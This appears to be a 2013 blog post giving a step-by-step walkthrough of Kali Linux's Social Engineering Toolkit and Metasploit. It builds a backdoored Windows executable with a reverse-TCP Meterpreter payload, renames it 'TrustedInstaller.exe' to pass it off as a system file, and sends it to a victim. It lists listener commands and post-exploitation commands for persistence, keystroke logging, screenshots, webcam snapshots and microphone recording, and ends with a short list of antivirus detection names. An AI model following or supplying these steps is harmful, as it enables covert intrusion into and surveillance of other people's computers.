---
layout: post
title: Kali Linux se-toolkit Social Engineering Toolkit
meta: How to use Kali Linux se-toolkit Social Engineering Toolkit. Start by going to Applications > Kali Linux > Exploitation Tools > Social Engineering Toolkit > se-toolkit
posted: 11-12-2013
category: blog
---

<h3>Getting Started</h3>
<p>Applications > Kali Linux > Exploitation Tools > Social Engineering Toolkit > se-toolkit</p>
<code>1) Social-Engineering Attacks</code><br>
<code>4) Create a Payload and Listener</code>
<p>Select the localhost machine. Remember: This is the attackers IPv4 address.</p>
<code>verse): 192.168.1.100</code><br>
<code>2) Windows Reverse_TCP meterpreter | Spawn a meterpreter shell on victim and send back to attacker</code><br>
<code>16) Backdoored Executable (Best)</code>
<p>Press, <b>"{ENTER}"</b> to select port 443 for the listener.</p>
<code>set:payloads> Port of the listener [443]: {ENTER}</code>
<p>Type, <b>"yes"</b> to start the listener now. There's a way to restart the listener at any time.</p>
<code>set> Start the listener now? [yes|no]: yes</code>
<p>Locate the "msf.exe" in "/usr/share/set" and,</p>
<p>Right Mouse Click > Properties > Permissions > Poperties Execute Allow</p>
<p>Rename "msf.exe" to "TrustedInstaller.exe" and send to victum pc.</p>

<br>

<h3>Restarting Listener</h3>
<ol>
	<li><code>msfconsole</code></li>
	<li><code>use exploit/multi/handler</code></li>
	<li><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></li>
	<li><code>set LPORT 443</code></li>
	<li><code>set LHOST 192.168.1.100</code></li>
	<li><code>exploit</code></li>
</ol>

<br>

<table>
  <thead>
    <tr>
    <th>Simple Commands</th>
    <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>help</td>
      <td>Help menu</td>
    </tr>
    <tr>
      <td>sessions -v</td>
      <td>List all running sessions</td>
    </tr>
    <tr>
      <td>sessions -i 1</td>
      <td>Opens sessions #1</td>
    </tr>
    <tr>
      <td>ps</td>
      <td>List running process</td>
    </tr>
    <tr>
      <td>migrate 1892</td>
      <td>1892 = sessions 1 explorer.exe</td>
    </tr>
    <tr>
      <td>run persistence -h</td>
      <td>Shows persistences help</td>
    </tr>
    <tr>
      <td>run persistence -U -i 5 -p 443 -r 192.168.100.100</td>
      <td>Runs .exe on startup</td>
    </tr>
    <tr>
      <td>keyscan_start</td>
      <td>Starts capturing keystrokes</td>
    </tr>
    <tr>
      <td>keyscan_dump</td>
      <td>Dump the keystroke buffer</td>
    </tr>
    <tr>
      <td>keyscan_stop</td>
      <td>Stops captureing keystrokes</td>
    </tr>
    <tr>
      <td>screenshot</td>
      <td>Grab a screenshot of the interactive desktop</td>
    </tr>
    <tr>
      <td>webcam_snap</td>
      <td>Take a snapshot from the specified webcam</td>
    </tr>
    <tr>
      <td>record_mic</td>
      <td>Record audio from the default microphone for X seconds</td>
    </tr>
  </tbody>
</table>

<br>

<h3>Removing</h3>
<p>As of right now <a href='http://www.comodo.com/home/internet-security/free-internet-security.php'>Comodo Internet Secuirty</a> detects the following threat.</p>
<h6>TrojWare.Win32.Rozena.A@275288211</h6>
<ul>
<li>C:\Users\john\AppData\Local\Temp\radCC758.tmp\svchost.exe</li>
<li>Parent: wsript.exe(1628)</li>
</ul>
<h6>TrojWare.VBS.TrojanDropper.Agent.fe@299958242</h6>
<ul>
<li>C:\Users\john\AppData\Local\Temp\iktauyz.vbs</li>
</ul>
<h6>Heur.Gen.Lama@117024093</h6>
<ul>
<li>C:\Users\john\Desktop\TrustedInstaller.exe</li>
</ul>
